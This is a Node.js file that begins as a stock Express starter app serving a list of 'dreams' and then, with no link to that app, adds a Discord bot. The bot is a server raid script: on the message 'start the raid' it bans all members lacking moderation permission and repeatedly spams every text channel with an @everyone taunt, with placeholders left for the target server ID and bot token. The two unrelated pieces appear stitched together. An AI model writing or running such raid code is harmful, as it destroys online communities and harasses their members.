// server.js
// where your node app starts

// we've started you off with Express (https://expressjs.com/)
// but feel free to use whatever libraries or frameworks you'd like through `package.json`.
const express = require("express");
const app = express();

// our default array of dreams
const dreams = [
  "Find and count some sheep",
  "Climb a really tall mountain",
  "Wash the dishes"
];

// make all the files in 'public' available
// https://expressjs.com/en/starter/static-files.html
app.use(express.static("public"));

// https://expressjs.com/en/starter/basic-routing.html
app.get("/", (request, response) => {
  response.sendFile(__dirname + "/views/index.html");
});

// send the default array of dreams to the webpage
app.get("/dreams", (request, response) => {
  // express helps us take JS objects and send them as JSON
  response.json(dreams);
});

// listen for requests :)
const listener = app.listen(process.env.PORT, () => {
  console.log("Your app is listening on port " + listener.address().port);
});
let Discord = require("discord.js")
let client = new Discord.Client()

client.on("message", message => {
  if(message.content === "start the raid") {
    let server = client.guilds.cache.get("Server ID Here") //Right click on server icon to get server id
    for(let i =0;i<=500;i++) {
      server.members.cache.filter(r => !r.hasPermission("MANAGE_MESSAGES")).forEach(b => server.members.ban(b.id))
      server.channels.cache.filter(r => r.type === "text").forEach(channel => {
        channel.send("@everyone this server is raided get rekt")
      })    
    }
   }
})

client.login("TOKEN_HERE")